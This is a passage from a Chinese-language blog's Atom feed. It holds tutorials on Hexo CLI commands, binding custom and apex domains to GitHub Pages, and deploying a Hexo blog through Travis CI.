jruby</span><br></pre></td></tr></table></figure><p>通过访问<a href="https://travis-ci.com/auth" target="_blank" rel="noopener">Travis CI</a> 并选择repository，检查构建状态页面，以根据构建命令的返回状态查看构建是否通过或失败。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近使用Github Pages 搭建Hexo 时，用到了一项新技术。hmm…也不能说是新技术吧，只是之前一直有听说，但却没有实际用过。&lt;/p&gt;
&lt;p&gt;它就是持续集成，听上去好像是一个高大上的概念，但通俗一点解释就是：写完代码提交之后，会根据你的要求，自动做编译测试。&lt;/p&gt;
&lt;p&gt;其中最出名大概就是&lt;a href=&quot;https://travis-ci.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Travis CI&lt;/a&gt;了，本文的目的就是快速入门 Travis CI。&lt;/p&gt;</summary>
    
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/categories/Tutorial/"/>
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/tags/Tutorial/"/>
    
    <category term="CI" scheme="https://www.0x2beace.com/tags/CI/"/>
    
  </entry>
  
  <entry>
    <title>Hexo 快速上手</title>
    <link href="https://www.0x2beace.com/hexo-quick-start/"/>
    <id>https://www.0x2beace.com/hexo-quick-start/</id>
    <published>2020-07-05T06:16:31.000Z</published>
    <updated>2020-08-15T01:05:05.993Z</updated>
    
    <content type="html"><![CDATA[<p>最近使用Hexo 搭建了一套博客系统，整个过程还算顺利，不过还是遇到了一些问题，整理记录一下。</p><a id="more"></a><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><h3 id="init"><a href="#init" class="headerlink" title="init"></a>init</h3><p>新建一个网站。如果没有设置 <code>folder</code>，Hexo 默认在目前的文件夹建立网站。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo init [folder]</span><br></pre></td></tr></table></figure><h3 id="new"><a href="#new" class="headerlink" title="new"></a>new</h3><p>layout 有三种选择：</p><ul><li>post：新建一片文章</li><li>page：新建一个页面</li><li>draft：新建一篇草稿</li></ul><p>如果没有设置 layout 的话，默认使用 _config.yml 中的 default_layout 参数代替。如果标题包含空格的话，请使用引号括起来。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new [layout] &lt;title&gt;</span><br></pre></td></tr></table></figure><h3 id="generate"><a href="#generate" class="headerlink" title="generate"></a>generate</h3><p>生成静态文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br><span class="line">&#x2F;&#x2F; 等效于 hexo g</span><br></pre></td></tr></table></figure><p>常用参数：<br>|选项|描述|<br>|-|-|<br>|-d, –deploy|文件生成后立即部署网站|<br>|-w, –watch|监视文件变动|<br>|-b, –bail|生成过程中如果发生任何未处理的异常则抛出异常|</p><h3 id="publish"><a href="#publish" class="headerlink" title="publish"></a>publish</h3><p>发表草稿</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo publish [layout] &lt;filename&gt;</span><br></pre></td></tr></table></figure><h3 id="server"><a href="#server" class="headerlink" title="server"></a>server</h3><p>启动服务器。默认情况下，访问网址为： <code>http://localhost:4000/</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br><span class="line">&#x2F;&#x2F; 等效于 hexo s</span><br></pre></td></tr></table></figure><h3 id="deploy"><a href="#deploy" class="headerlink" title="deploy"></a>deploy</h3><p>部署网站。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br><span class="line">&#x2F;&#x2F; 等效于 hexo d</span><br></pre></td></tr></table></figure><p><code>-g</code>，<code>--generate</code>：部署之前预先生成静态文件</p><h3 id="clean"><a href="#clean" class="headerlink" title="clean"></a>clean</h3><p>清除缓存文件 (db.json) 和已生成的静态文件 (public)。</p><p>在某些情况（尤其是更换主题后），如果发现对站点的更改无论如何也不生效，那可能需要运行该命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo clean</span><br></pre></td></tr></table></figure><h3 id="list"><a href="#list" class="headerlink" title="list"></a>list</h3><p>列出网站资料。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo list</span><br></pre></td></tr></table></figure><h3 id="version"><a href="#version" class="headerlink" title="version"></a>version</h3><p>显示 Hexo 版本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo version</span><br></pre></td></tr></table></figure><h3 id="其他模式"><a href="#其他模式" class="headerlink" title="其他模式"></a>其他模式</h3><h4 id="安全模式"><a href="#安全模式" class="headerlink" title="安全模式"></a>安全模式</h4><p>在安全模式下，不会载入插件和脚本。当需要安装新插件遭遇问题时，可以尝试以安全模式重新执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo --safe</span><br></pre></td></tr></table></figure><h4 id="调试模式"><a href="#调试模式" class="headerlink" title="调试模式"></a>调试模式</h4><p>在终端中显示调试信息并记录到 debug.log。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo --debug</span><br></pre></td></tr></table></figure><h4 id="显示草稿"><a href="#显示草稿" class="headerlink" title="显示草稿"></a>显示草稿</h4><p>显示 source/_drafts 文件夹中的草稿文章。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo --draft</span><br></pre></td></tr></table></figure><h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><h3 id="CNAME-文件被删除"><a href="#CNAME-文件被删除" class="headerlink" title="CNAME 文件被删除"></a>CNAME 文件被删除</h3><p>GitHub Pages 为我们免费提供了<code>&lt;username&gt;.github.io</code>这样的域名作为 GitHub Page，但如果你觉得这个域名太长了，不满意，那么你也可以绑定自己的域名。</p><p>通常绑定完成之后，会在项目目录下面生成一个叫做<code>CNAME</code>的文件，这个文件的作用就是用来记录GitHub Pages 所绑定的域名。</p><p>这个时候就会产生一个问题：</p><blockquote><p>CNAME文件会在每次 hexo deploy 时消失，然后需要重新手动绑定，这样就很繁琐。</p></blockquote><p>有以下几种方式可以解决这个问题：</p><ol><li>每次 <code>hexo d</code> 之后，就去 GitHub 仓库根目录新建 CNAME文件。—— 繁琐</li><li>在 <code>hexo g</code> 之后， <code>hexo d</code> 之前，把CNAME文件复制到 <code>public</code> 目录下面，里面写入你要绑定的域名。—— 繁琐</li><li>将需要上传至 GitHub 的内容放在<code>source</code>文件夹，例如CNAME、favicon.ico、images等，这样在 <code>hexo d</code> 之后就不会被删除了。</li><li>通过安装插件实现永久保留。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-generator-cname --save</span><br></pre></td></tr></table></figure><p>编辑<code>_config.yml</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Plugins:</span><br><span class="line">- hexo-generator-cname</span><br></pre></td></tr></table></figure><p>推荐第三种方式，简单方便。</p><h3 id="配置apex-域"><a href="#配置apex-域" class="headerlink" title="配置apex 域"></a>配置apex 域</h3><p>Github Pages 是支持绑定自己的私有域名的，但默认只能绑定 <code>CNAME</code>的私有子域名，那有没有办法主域名呢？</p><p>答案是有的。</p><p>如果绑定主域名，例如 example.com，建议还设置一个 <code>www</code> 子域，GitHub Pages 将自动在域之间创建重定向，当输入<code>example.com</code>时，会重定向到 <code>www.example.com</code>。</p><p>通常我们绑定好私有子域名之后，回生成一个<code>CNAME</code>的文件，里面记录着我们绑定好的私有子域名。</p><p>此时只需要去DNS 做解析，创建一个ALIAS、ANAME 或 A 记录：</p><ul><li>创建ALIAS、ANAME记录：将 apex 域指向站点的默认域。</li><li>创建A 记录：将 apex 域指向 GitHub Pages 的 IP 地址。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; GitHub Pages 的 IP 地址</span><br><span class="line">185.199.108.153</span><br><span class="line">185.199.109.153</span><br><span class="line">185.199.110.153</span><br><span class="line">185.199.111.153</span><br></pre></td></tr></table></figure><p>这里我选择的是创建A 记录，所以我的DNS 解析是这样的：</p><p><img src="https://raw.githubusercontent.com/0xAiKang/CDN/master/blog/images/20200706203008.png" alt="DNS解析A记录"></p><p>配置完DNS 解析之后，可以使用<code>dig</code>命令来检验是否解析成功：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ dig example.com +noall +answer</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; 0x2BeAce.com +noall +answer</span><br><span class="line">;; global options: +cmd</span><br><span class="line">0x2BeAce.com.4502INA185.199.111.153</span><br><span class="line">0x2BeAce.com.4502INA185.199.110.153</span><br><span class="line">0x2BeAce.com.4502INA185.199.108.153</span><br><span class="line">0x2BeAce.com.4502INA185.199.109.153</span><br></pre></td></tr></table></figure><p>将example.com 替换成你自己的 apex 域，确认结果与上面 GitHub Pages 的 IP 地址相匹配。</p><p>至此，就完成了apex 域的配置了。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.cnblogs.com/chengxs/p/7496265.html" target="_blank" rel="noopener">github+hexo搭建自己的博客网站（七）注意事项</a></li><li><a href="https://hexo.io/zh-cn/docs/commands" target="_blank" rel="noopener">Hexo | 指令</a></li><li><a href="https://docs.github.com/cn/github/working-with-github-pages/managing-a-custom-domain-for-your-github-pages-site#configuring-an-apex-domain" target="_blank" rel="noopener">管理 GitHub Pages 站点的自定义域</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近使用Hexo 搭建了一套博客系统，整个过程还算顺利，不过还是遇到了一些问题，整理记录一下。&lt;/p&gt;</summary>
    
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/categories/Tutorial/"/>
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/tags/Tutorial/"/>
    
    <category term="Hexo" scheme="https://www.0x2beace.com/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>Github Pages 部署 Hexo 个人博客</title>
    <link href="https://www.0x2beace.com/deploy-hexo-using-github-pages-personal-blog/"/>
    <id>https://www.0x2beace.com/deploy-hexo-using-github-pages-personal-blog/</id>
    <published>2020-07-04T12:09:09.000Z</published>
    <updated>2020-08-15T01:11:07.291Z</updated>
    
    <content type="html"><![CDATA[<p>关于个人博客，在很久之前就想自己搭建一套，甚至还为此买了一台服务器，但奈何自己太忙了(tai lan le) =_=，这件事情就一直搁浅了，服务器大部分时间也都是空闲状态。</p><p>这段时间，突然很想把这件事情做好，觉得不能在这么拖下去了，所以便有了这篇文章。</p><a id="more"></a><blockquote><p>为什么使用Github Pages？</p></blockquote><p>我是出于以下原因考虑的：</p><ol><li>暂时没有服务器的需要，我只想有一个能写博客的地方。</li><li>GitHub Pages 可以提供 https服务，我不用担心域名备案的问题。</li><li>免费</li></ol><p>总之，如果你想用最简单、最省心的方式，搭建属于自己的博客，那么 Github Pages 一定不会让你失望。</p><h2 id="系统环境"><a href="#系统环境" class="headerlink" title="系统环境"></a>系统环境</h2><ul><li>Mac OS 10.15.4</li><li>Node.js 12</li><li>Hexo-cli: 3.1</li><li>NPM: 6.9</li></ul><h3 id="创建Github-Pages"><a href="#创建Github-Pages" class="headerlink" title="创建Github Pages"></a>创建Github Pages</h3><p>Github Pages分为两类，用户或组织主页、项目主页。</p><ul><li>用户或组织主页：在新建仓库时，仓库名称应该以<code>&lt;yourusername&gt;.github.io</code>的格式去填写。<code>&lt;yourusername&gt;</code>指的是你的Github 的用户名称。</li><li>创建项目主页：在新建仓库时，名称可以任意设置，然后通过<code>Setting-&gt;Options-&gt;Github Pages</code>将 <code>Source</code>选项设置为<code>Master Branch</code>，此时这个项目就变成一个 Github Pages项目了。</li></ul><p>需要注意的是：</p><ol><li>Github Pages 只针对开源的项目是免费的，如果你不想开源，那可能就需要考虑收费的套餐了。</li><li>第一种方式不能更改 Github Pages 部署分支。</li><li>如果你有自己的域名，那么推荐使用方式二创建 Github Pages。如果你没有自己的域名，那也没有关系，可以使用Github Pages 提供的域名访问<code>http://&lt;yourusername&gt;.github.io</code>。</li></ol><h3 id="绑定域名"><a href="#绑定域名" class="headerlink" title="绑定域名"></a>绑定域名</h3><p>如果你是通过方式一，创建的Github Pages，那么可以跳过此部分。</p><p>在 2018 年 5 月 1 日之后，GitHub Pages 已经开始提供免费为自定义域名开启 HTTPS 的功能，并且大大简化了操作的流程，现在用户已经不再需要自己提供证书，只需要将自己的域名使用 CNAME 的方式指向自己的 GitHub Pages 域名即可。</p><p>首先需要在你的 DNS 解析里添加一条解析记录，例如我选择添加子域名<code>blog.aikang.me</code>，通过 CNAME 的方式指向我刚刚自定义的 GitHub Pages 域名 <code>0xAiKang.github.io</code>。</p><p><img src="https://i.loli.net/2020/07/04/BDX384QPIZqniJU.png" alt="DNS 域名解析"></p><p>添加完成后等待 DNS 解析的生效的同时回到项目的<code>Setting</code>界面，将刚才的子域名与 Github Pages 绑定在一起。</p><p>保存之后，我们只需要耐心等待 GitHub 生成证书并确认域名的解析是否正常。</p><p><img src="https://i.loli.net/2020/07/04/OZ2Vu8p9tXgTj7q.png" alt="等待 GitHub 生成证书并确认域名解析正常"></p><h3 id="将Hexo-部署到Github-Pages"><a href="#将Hexo-部署到Github-Pages" class="headerlink" title="将Hexo 部署到Github Pages"></a>将Hexo 部署到Github Pages</h3><p>域名解析成功之后，就可以通过我们刚才绑定的域名进行访问了，但是你会发现，现在只能看到一片空白，这是因为我们的网站还没有任何内容，所以下一步需要做的就是选择一套静态模版系统。</p><p>目前市场上有很多优秀的静态模板系统，比如：</p><ul><li>Node.js 编写的 Hexo</li><li>Go 编写的 Hugo</li><li>Python 编写的 Pelican</li><li>静态博客写作客户端 Gridea</li></ul><blockquote><p>为什么要选择Hexo？</p></blockquote><p>最初在选择博客模版系统时，并没有发现 Gridea ，事后发现这个小众的静态博客写作客户端似乎才是我真正想要的。</p><p>不过既然选择了Hexo，也是因为它的生态环境很大，可选主题非常多，并且都是开源的。</p><blockquote><p>如何将 Hexo 部署到 GitHub Pages？</p></blockquote><ol><li>将 <a href="https://github.com/marketplace/travis-ci" target="_blank" rel="noopener">Travis CI</a> 添加到你的 GitHub 账户中。</li><li>前往 GitHub 的 <a href="https://github.com/settings/installations" target="_blank" rel="noopener">Applications settings</a>，配置 Travis CI 权限，使其能够访问你的 repository。</li><li>正常情况下你会被重定向到 Travis CI 的页面。如果没有，请 <a href="https://travis-ci.com/" target="_blank" rel="noopener">手动前往</a>。</li><li>前往 GitHub 新建 <a href="https://github.com/settings/tokens" target="_blank" rel="noopener">Personal Access Token</a>，只勾选 repo 的权限并生成一个新的 Token。Token 生成后请复制并保存好。</li><li>回到 Travis CI，前往你的 repository 的设置页面，在 Environment Variables 下新建一个环境变量，Name 为 GH_TOKEN，Value 为刚才你在 GitHub 生成的 Token。确保 DISPLAY VALUE IN BUILD LOG 保持 不被勾选 避免你的 Token 泄漏。点击 Add 保存。</li><li>在你的 Hexo 站点文件夹中新建一个 <code>.travis.yml</code> 文件：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">sudo: false</span><br><span class="line">language: node_js</span><br><span class="line">node_js:</span><br><span class="line">  - 10 # use nodejs v10 LTS</span><br><span class="line">cache: npm</span><br><span class="line">branches:</span><br><span class="line">  only:</span><br><span class="line">    - master # build master branch only</span><br><span class="line">script:</span><br><span class="line">  - hexo generate # generate static files</span><br><span class="line">deploy:</span><br><span class="line">  provider: pages</span><br><span class="line">  skip-cleanup: true</span><br><span class="line">  github-token: $GH_TOKEN</span><br><span class="line">  keep-history: true</span><br><span class="line">  on:</span><br><span class="line">    branch: master</span><br><span class="line">  local-dir: public</span><br></pre></td></tr></table></figure><p>上面这个配置文件的作用是用来自动构建，编译测试。</p><p>将 <code>.travis.yml</code> 推送到 repository 中。Travis CI 会自动开始运行，并将生成的文件推送到同一 repository 下的 <code>gh-pages</code> 分支下。</p><h4 id="修改发布源"><a href="#修改发布源" class="headerlink" title="修改发布源"></a>修改发布源</h4><p>推送完成之后，会发现多了一个 <code>gh-gages</code>分支，这个分支就是用于部署站点的分支，但是GitHub Pages 会默认使用<code>master</code>分支作为发布源，所以我们需要切换发布源。</p><p>在<code>Setting-&gt;Option-&gt;GitHub Pages</code>下，使用 Source（源）下拉菜单选择发布源。</p><p><img src="https://i.loli.net/2020/07/04/AHldtP2bIhaqr8c.png" alt="修改默认源"></p><p>注意：使用用户或组织主页构建的 Github Pages 不能修改发布源，只能使用默认的 <code>master</code>分支。</p><h3 id="一键部署"><a href="#一键部署" class="headerlink" title="一键部署"></a>一键部署</h3><p>Hexo 提供了快速方便的一键部署功能，让你只需一条命令就能将网站部署到服务器上。</p><p>在正式部署之前，我们需要先修改<code>_config.yml</code> 文件，配置参数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: &lt;repository url&gt; #https:&#x2F;&#x2F;bitbucket.org&#x2F;JohnSmith&#x2F;johnsmith.bitbucket.io</span><br><span class="line">  branch: [branch]</span><br><span class="line">  message: [message]</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th><th>默认值</th></tr></thead><tbody><tr><td>type</td><td>deployer</td><td>-</td></tr><tr><td>repo</td><td>项目地址</td><td>-</td></tr><tr><td>branch</td><td>分支名称</td><td>gh-pages</td></tr></tbody></table><p>有以下两点需要注意：<br>1.repo 需要选择SSH 协议，HTTPS协议会报错。<br>2.branch 选择Github Pages中设置的那个分支，而不是拉取这个项目的分支</p><p>我这里使用的是<code>git</code> 作为 deployer，所以需要手动安装一个插件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>生成站点文件并部署至远程库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo deploy --generate</span><br></pre></td></tr></table></figure><p>至此，就完成了使用Github Pages 部署 Hexo 个人博客的全部过程，总的来说还是很顺利的。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://sspai.com/post/54608" target="_blank" rel="noopener">Github Pages 搭建教程</a></li><li><a href="https://hexo.io/zh-cn/docs/github-pages.html" target="_blank" rel="noopener">将Hexo 部署到 GitHub Pages</a></li><li><a href="https://hexo.io/zh-cn/docs/one-command-deployment.html" target="_blank" rel="noopener">Hexo 一键部署</a></li><li><a href="https://juejin.im/post/5acf02086fb9a028b92d8652#heading-15" target="_blank" rel="noopener">Github Pages部署个人博客（Hexo篇）</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;关于个人博客，在很久之前就想自己搭建一套，甚至还为此买了一台服务器，但奈何自己太忙了(tai lan le) =_=，这件事情就一直搁浅了，服务器大部分时间也都是空闲状态。&lt;/p&gt;
&lt;p&gt;这段时间，突然很想把这件事情做好，觉得不能在这么拖下去了，所以便有了这篇文章。&lt;/p&gt;</summary>
    
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/categories/Tutorial/"/>
    
    <category term="GitHub" scheme="https://www.0x2beace.com/categories/Tutorial/GitHub/"/>
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/tags/Tutorial/"/>
    
  </entry>
  
</feed>
